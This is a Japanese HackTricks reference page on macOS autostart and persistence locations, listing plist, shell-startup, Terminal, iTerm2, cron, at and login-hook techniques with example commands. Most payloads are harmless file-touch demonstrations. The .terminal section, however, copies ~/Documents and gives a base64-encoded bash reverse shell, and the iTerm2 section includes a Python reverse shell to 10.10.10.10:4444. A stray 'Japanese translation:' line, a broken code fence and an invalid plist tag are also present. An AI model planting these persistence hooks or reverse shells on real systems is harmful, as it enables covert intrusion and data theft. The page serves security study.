# macOS自動起動

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする。
- **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングテクニックを共有**してください。

</details>

このセクションは、ブログシリーズ[**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)に大きく基づいており、目標は**Autostart Locationsを追加**（可能であれば）、最新バージョンのmacOS（13.4）で**動作しているテクニック**を示し、**必要な権限**を指定することです。

## サンドボックス回避

{% hint style="success" %}
ここでは、**サンドボックス回避**に役立つ起動場所を見つけることができます。これにより、**ファイルに書き込んで**、非常に**一般的な** **アクション**、特定の**時間**、または通常**ルート権限が必要ないサンドボックス内で実行できる**アクション**を**待機**することができます。
{% endhint %}

### Launchd

- サンドボックス回避に役立つ：[✅](https://emojipedia.org/check-mark-button)
- TCCバイパス：[🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/Library/LaunchAgents`**
  - トリガー：再起動
  - ルート権限が必要
- **`/Library/LaunchDaemons`**
  - トリガー：再起動
  - ルート権限が必要
- **`/System/Library/LaunchAgents`**
  - トリガー：再起動
  - ルート権限が必要
- **`/System/Library/LaunchDaemons`**
  - トリガー：再起動
  - ルート権限が必要
- **`~/Library/LaunchAgents`**
  - トリガー：再ログイン
- **`~/Library/LaunchDemons`**
  - トリガー：再ログイン

#### 説明と悪用

**`launchd`**は、OX Sカーネルによって起動時に最初に実行され、シャットダウン時に最後に終了する**プロセス**です。常に**PID 1**を持っている必要があります。このプロセスは、**ASEP** **plists**に示された構成を**読み取り**、**実行**します。

- `/Library/LaunchAgents`：管理者によってインストールされたユーザーごとのエージェント
- `/Library/LaunchDaemons`：管理者によってインストールされたシステム全体のデーモン
- `/System/Library/LaunchAgents`：Appleによって提供されるユーザーごとのエージェント
- `/System/Library/LaunchDaemons`：Appleによって提供されるシステム全体のデーモン

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents`および`/Users/$USER/Library/LaunchDemons`にある**plists**が**ログインユーザーの権限**で開始されます。

**エージェントとデーモンの主な違いは、エージェントはユーザーがログインすると読み込まれ、デーモンはシステムの起動時に読み込まれる**ことです（システムにアクセスする前にsshなどのサービスが実行される必要があるため）。また、エージェントはGUIを使用できますが、デーモンはバックグラウンドで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
いくつかのケースでは、**ユーザーがログインする前にエージェントを実行する必要がある**場合があります。これらは**PreLoginAgents**と呼ばれます。たとえば、これはログイン時に支援技術を提供するのに役立ちます。`/Library/LaunchAgents`にも見つけることができます（[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。

{% hint style="info" %}
新しいデーモンやエージェントの構成ファイルは、**次回の再起動後**または`launchctl load <target.plist>`を使用して**ロードされます**。`.plist`の拡張子なしで`.plist`ファイルをロードすることも可能ですが、（ただし、これらの`.plist`ファイルは再起動後に自動的にロードされません）。\
`launchctl unload <target.plist>`で**アンロード**することも可能です（それを指すプロセスは終了します）。

**エージェント**または**デーモン**が**実行されるのを妨げる**（オーバーライドなど）**何もないこと**を**確認**するには、次のコマンドを実行します：`sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

現在のユーザーによってロードされているすべてのエージェントとデーモンをリストアップします：
```bash
launchctl list
```
{% hint style="warning" %}
もしplistがユーザーに所有されている場合、それがデーモンシステムワイドフォルダにあっても、**タスクはユーザーとして実行**され、rootとして実行されません。これにより特権昇格攻撃を防ぐことができます。
{% endhint %}

### シェル起動ファイル

解説: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
解説 (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* ただし、これらのファイルを読み込むシェルを実行するTCCバイパスを持つアプリを見つける必要があります

#### ロケーション

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **トリガー**: zshでターミナルを開く
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **トリガー**: zshでターミナルを開く
* root権限が必要
* **`~/.zlogout`**
* **トリガー**: zshでターミナルを終了する
* **`/etc/zlogout`**
* **トリガー**: zshでターミナルを終了する
* root権限が必要
* 他にもあるかもしれない: **`man zsh`**
* **`~/.bashrc`**
* **トリガー**: bashでターミナルを開く
* `/etc/profile` (動作せず)
* `~/.profile` (動作せず)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **トリガー**: xtermでトリガーされると予想されていますが、**インストールされていません**。インストール後もこのエラーが表示されます: xterm: `DISPLAY is not set`

#### 説明と悪用

`zsh`や`bash`などのシェル環境を初期化するとき、**特定の起動ファイルが実行**されます。macOSは現在、デフォルトシェルとして`/bin/zsh`を使用しています。このシェルは、Terminalアプリケーションが起動されたときやデバイスがSSH経由でアクセスされたときに自動的にアクセスされます。`bash`や`sh`もmacOSに存在しますが、使用するには明示的に呼び出す必要があります。

`man zsh`で読むことができるzshのmanページには、起動ファイルの詳細な説明があります。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再オープンされたアプリケーション

{% hint style="danger" %}
指定された悪用の設定とログアウト、ログイン、または再起動を行っても、アプリを実行することができませんでした。（アプリが実行されていなかった可能性があります。これらのアクションが実行されるときに実行される必要があるかもしれません）
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **トリガー**: アプリケーションの再オープンを再起動

#### 説明と悪用

再オープンするすべてのアプリケーションは、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`内にあります。

したがって、再オープンされるアプリケーションに自分のアプリを起動させるには、**アプリをリストに追加**するだけです。

UUIDは、そのディレクトリをリストアップするか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`で見つけることができます。

再オープンされるアプリケーションを確認するには、次の操作を行います:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**このリストにアプリケーションを追加する**には、次の方法を使用できます：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### ターミナルの設定

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* ユーザーが使用する場合、ターミナルはFDA権限を持つ

#### 位置

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **トリガー**: ターミナルを開く

#### 説明と悪用

**`~/Library/Preferences`** には、アプリケーションのユーザーの設定が保存されています。これらの設定の一部には、**他のアプリケーション/スクリプトを実行**する構成が含まれることがあります。

たとえば、ターミナルは起動時にコマンドを実行できます:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、ファイル **`~/Library/Preferences/com.apple.Terminal.plist`** に次のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Japanese translation:

```markdown
したがって、システム内のターミナルの設定のplistが上書きされると、**`open`**機能を使用して**ターミナルを開き、そのコマンドが実行されます**。

これをcliから追加することができます：

{% code overflow="wrap" %}
```
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### ターミナルスクリプト / その他のファイル拡張子

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* ターミナルを使用してユーザーがFDA権限を持つ

#### 位置

* **どこでも**
* **トリガー**: ターミナルを開く

#### 説明と悪用

[**`.terminal`**スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**ターミナルアプリケーション**が自動的に起動され、そこで指定されたコマンドが実行されます。ターミナルアプリに特別な権限（TCCなど）がある場合、その特別な権限でコマンドが実行されます。

以下で試してみてください:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### オーディオプラグイン

解説: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
解説: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
* いくつかの追加のTCCアクセスを取得する可能性があります

#### 位置

* **`/Library/Audio/Plug-Ins/HAL`**
* ルート権限が必要
* **トリガー**: coreaudiodまたはコンピューターを再起動
* **`/Library/Audio/Plug-ins/Components`**
* ルート権限が必要
* **トリガー**: coreaudiodまたはコンピューターを再起動
* **`~/Library/Audio/Plug-ins/Components`**
* **トリガー**: coreaudiodまたはコンピューターを再起動
* **`/System/Library/Components`**
* ルート権限が必要
* **トリガー**: coreaudiodまたはコンピューターを再起動

#### 説明

以前の解説によると、**いくつかのオーディオプラグインをコンパイル**してロードすることが可能です。

### QuickLookプラグイン

解説: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
* いくつかの追加のTCCアクセスを取得する可能性があります

#### 位置

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明と悪用

QuickLookプラグインは、**ファイルのプレビューをトリガー**し（Finderでファイルを選択してスペースバーを押す）、そのファイルタイプをサポートする**プラグインがインストールされている**場合に実行されます。

独自のQuickLookプラグインをコンパイルし、前述のいずれかの場所に配置してロードし、サポートされるファイルに移動してスペースを押してトリガーすることが可能です。

### ~~ログイン/ログアウトフック~~

{% hint style="danger" %}
私にはうまくいきませんでした。ユーザーログインフックでもルートログアウトフックでもありませんでした
{% endhint %}

**解説**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります
* `~/Library/Preferences/com.apple.loginwindow.plist`にあります

これらは非推奨ですが、ユーザーがログインするときにコマンドを実行するために使用することができます。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は`/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`に保存されています。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**に格納されているのは、rootユーザーのものです。

## 条件付きサンドボックス回避

{% hint style="success" %}
ここでは、**サンドボックス回避**に役立つ起動場所を見つけることができます。これにより、**ファイルに書き込んで単純に実行**することができ、特定の**インストールされたプログラム、"一般的でない"ユーザー**のアクションや環境のような**非常に一般的でない条件**を期待することができます。
{% endhint %}

### Cron

**解説**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* サンドボックス回避に役立つ: [✅](https://emojipedia.org/check-mark-button)
* ただし、`crontab`バイナリを実行できる必要があります
* またはrootである必要があります
* TCC回避: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* 直接書き込みアクセスにはrootが必要です。`crontab <file>`を実行できる場合はrootは必要ありません
* **トリガー**: cronジョブに依存します

#### 説明と悪用

**現在のユーザー**のcronジョブをリストアップするには:
```bash
crontab -l
```
MacOSでは、**`/usr/lib/cron/tabs/`**と**`/var/at/tabs/`**にユーザーのすべてのcronジョブを見ることができます（root権限が必要です）。

MacOSでは、**特定の頻度**でスクリプトを実行するいくつかのフォルダが次の場所にあります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
以下では、通常の**cron** **ジョブ**、あまり使用されていない**at** **ジョブ**、および一時ファイルのクリーニングに主に使用される**periodic** **ジョブ**が見つかります。 日次のperiodicジョブは、例えば次のように実行できます：`periodic daily`。

**ユーザーのcronジョブをプログラムで追加**するには、次のようにすることができます：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* 便利なサンドボックス回避: [✅](https://emojipedia.org/check-mark-button)
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* iTerm2はTCC権限を付与していました

#### ロケーション

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **トリガー**: iTermを開く
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **トリガー**: iTermを開く
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **トリガー**: iTermを開く

#### 説明と悪用

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**に保存されたスクリプトが実行されます。例えば:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2の設定は**`~/Library/Preferences/com.googlecode.iterm2.plist`**にあり、iTerm2ターミナルが開かれるときに**実行するコマンドを示す**ことができます。

この設定はiTerm2の設定で構成できます：

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

そして、コマンドは設定に反映されます：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
次のようにして、実行するコマンドを設定できます：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
**iTerm2の設定を悪用する他の方法**が非常に可能性が高いです。
{% endhint %}

### xbar

解説: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* ただし、xbarをインストールする必要があります
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* アクセシビリティ権限が必要です

#### 位置

* **`~/Library/Application\ Support/xbar/plugins/`**
* **トリガー**: xbarが実行されるとき

#### 説明

人気のあるプログラム [**xbar**](https://github.com/matryer/xbar) がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`** にシェルスクリプトを記述することが可能で、xbarが起動されると実行されます:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**解説**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* ただし、Hammerspoonをインストールする必要があります
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* アクセシビリティ権限が必要です

#### 位置

* **`~/.hammerspoon/init.lua`**
* **トリガー**: Hammerspoonが実行されるとき

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は、**macOS**向けの自動化プラットフォームとして機能し、**LUAスクリプト言語**を活用しています。特筆すべきは、完全なAppleScriptコードの統合とシェルスクリプトの実行をサポートし、スクリプトの機能を大幅に向上させています。

このアプリは、単一のファイルである `~/.hammerspoon/init.lua` を探し、スクリプトが実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* 便利なサンドボックス回避方法: [✅](https://emojipedia.org/check-mark-button)
* ただし、BetterTouchToolをインストールする必要があります
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* Automation-ShortcutsおよびAccessibility権限が必要です

#### 位置

* `~/Library/Application Support/BetterTouchTool/*`

このツールは、特定のショートカットが押されたときにアプリケーションやスクリプトを実行することができます。攻撃者は、**データベース内で独自のショートカットとアクションを設定して任意のコードを実行する**可能性があります（ショートカットは単にキーを押すだけでも可能です）。

### Alfred

* 便利なサンドボックス回避方法: [✅](https://emojipedia.org/check-mark-button)
* ただし、Alfredをインストールする必要があります
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* Automation、Accessibility、さらにはFull-Diskアクセス権限が必要です

#### 位置

* `???`

特定の条件が満たされたときにコードを実行できるワークフローを作成できます。攻撃者がワークフローファイルを作成し、Alfredがそれをロードする可能性があります（ワークフローを使用するにはプレミアムバージョンを購入する必要があります）。

### SSHRC

解説: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* 便利なサンドボックス回避方法: [✅](https://emojipedia.org/check-mark-button)
* ただし、sshを有効にして使用する必要があります
* TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
* SSHはFDAアクセスを持っている必要があります

#### 位置

* **`~/.ssh/rc`**
* **トリガー**: ssh経由でログイン
* **`/etc/ssh/sshrc`**
* ルート権限が必要
* **トリガー**: ssh経由でログイン

{% hint style="danger" %}
sshをオンにするにはFull Disk Accessが必要です:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### 説明 & Exploitation

デフォルトでは、`/etc/ssh/sshd_config`内で`PermitUserRC no`が指定されていない限り、ユーザが**SSH経由でログイン**すると、スクリプト**`/etc/ssh/sshrc`**と**`~/.ssh/rc`**が実行されます。

### **ログインアイテム**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* ただし、`osascript`を引数と共に実行する必要があります
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### ロケーション

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **トリガー:** ログイン
* Exploitペイロードは**`osascript`**を呼び出して保存されています
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **トリガー:** ログイン
* ルート権限が必要

#### 説明

システム環境設定 -> ユーザとグループ -> **ログイン項目**には、**ユーザがログインするときに実行される項目**があります。\
これらをコマンドラインからリストアップ、追加、削除することが可能です。
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらのアイテムはファイル**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**に保存されています。

**ログインアイテム**は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用して指定することもでき、このAPIは構成を**`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**に保存します。

### ZIPをログインアイテムとして使用する

(ログインアイテムに関する前のセクションを確認してください、これは拡張です)

**ZIP**ファイルを**ログインアイテム**として保存すると、**`Archive Utility`**がそれを開きます。たとえば、ZIPファイルが**`~/Library`**に保存され、バックドアを含む**`LaunchAgents/file.plist`**というフォルダが含まれている場合、そのフォルダが作成され（デフォルトでは作成されません）、plistが追加されるため、次回ユーザーが再ログインすると、**plistで指定されたバックドアが実行**されます。

別のオプションとして、ユーザーのホームディレクトリに**`.bash_profile`**と**`.zshenv`**ファイルを作成することもできます。したがって、LaunchAgentsフォルダがすでに存在する場合でも、このテクニックは機能します。

### At

解説: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* ただし、**`at`**を**実行**する必要があり、**有効**である必要があります
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`at`**を**実行**する必要があり、**有効**である必要があります

#### **説明**

`at`タスクは、特定の時間に実行される**一度だけのタスクをスケジュール**するために設計されています。cronジョブとは異なり、`at`タスクは自動的に実行後に削除されます。これらのタスクはシステム再起動を超えて永続的であるため、特定の条件下でセキュリティ上の懸念事項としてマークされます。

**デフォルト**では**無効**ですが、**root**ユーザーは次のコマンドで**有効**にできます:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これは1時間後にファイルを作成します。
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq`を使用してジョブキューを確認します:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記では2つのスケジュールされたジョブが表示されています。`at -c JOBNUMBER`を使用してジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
AT タスクが有効になっていない場合、作成されたタスクは実行されません。
{% endhint %}

**ジョブファイル**は`/private/var/at/jobs/`にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名には、キュー、ジョブ番号、および実行予定時刻が含まれています。例として、`a0001a019bdcd2`を見てみましょう。

* `a` - これはキューです
* `0001a` - 16進数でのジョブ番号、`0x1a = 26`
* `019bdcd2` - 16進数での時間。エポック以降の経過分を表します。`0x019bdcd2`は10進数で`26991826`です。これを60倍すると`1619509560`になり、これは`GMT: 2021年4月27日、火曜日 7:46:00`です。

ジョブファイルを印刷すると、`at -c`を使用して取得した情報と同じであることがわかります。

### フォルダアクション

解説: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
解説: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* ただし、**`System Events`**に連絡するために`osascript`を引数付きで呼び出せる必要があり、フォルダアクションを構成できるようにする必要があります
* TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
* デスクトップ、ドキュメント、ダウンロードなど、いくつかの基本的なTCC権限があります

#### 位置

* **`/Library/Scripts/Folder Action Scripts`**
* ルートが必要
* **トリガー**: 指定されたフォルダへのアクセス
* **`~/Library/Scripts/Folder Action Scripts`**
* **トリガー**: 指定されたフォルダへのアクセス

#### 説明と悪用

フォルダアクションは、フォルダ内の変更（アイテムの追加、削除、フォルダウィンドウの開いたりリサイズなど）によって自動的にトリガーされるスクリプトです。これらのアクションはさまざまなタスクに利用でき、Finder UIやターミナルコマンドを使用してトリガーできます。

